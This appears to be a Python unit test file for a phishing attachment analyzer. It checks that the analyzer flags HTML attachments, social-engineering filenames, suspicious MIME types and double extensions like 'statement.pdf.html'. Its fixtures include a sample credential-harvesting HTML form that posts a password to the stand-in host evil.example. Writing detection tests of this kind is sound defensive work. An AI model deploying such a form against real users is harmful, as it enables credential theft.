import unittest

from app.analyzers.attachment_static import AttachmentArtifact, analyze_attachment, analyze_attachments


class AttachmentStaticTests(unittest.TestCase):
    def test_html_attachment_emits_multiple_rules(self):
        artifact = AttachmentArtifact(
            filename="Invoice_Review.html",
            content_type="text/html",
            size=128,
            payload=b"<html><form action='https://evil.example/login'><input type='password'></form></html>",
        )

        result = analyze_attachment(artifact)
        rule_ids = {rule["rule_id"] for rule in result["matched_rules"]}
        self.assertIn("attachment.html_extension", rule_ids)
        self.assertIn("attachment.social_engineering_filename", rule_ids)
        self.assertIn("attachment.suspicious_mime_type", rule_ids)
        self.assertIn("attachment.html_payload_marker", rule_ids)

    def test_double_extension_is_flagged(self):
        artifact = AttachmentArtifact(filename="statement.pdf.html", content_type="text/html")
        result = analyze_attachment(artifact)
        rule_ids = {rule["rule_id"] for rule in result["matched_rules"]}
        self.assertIn("attachment.disguised_double_extension", rule_ids)

    def test_attachment_aggregate_prefixes_filename_in_evidence(self):
        artifacts = [
            AttachmentArtifact(
                filename="Invoice_Review.html",
                content_type="text/html",
                size=128,
                payload=b"<html><form action='https://evil.example/login'><input type='password'></form></html>",
            ),
            AttachmentArtifact(
                filename="statement.pdf.html",
                content_type="text/html",
                size=64,
                payload=b"<html></html>",
            ),
        ]

        result = analyze_attachments(artifacts)

        self.assertEqual(result["attachment_count"], 2)
        self.assertEqual(result["risky_attachment_count"], 2)
        self.assertTrue(any(item.startswith("Invoice_Review.html:") for item in result["evidence"]))
        self.assertTrue(any(rule["evidence"].startswith("Invoice_Review.html:") for rule in result["matched_rules"]))


if __name__ == "__main__":
    unittest.main()
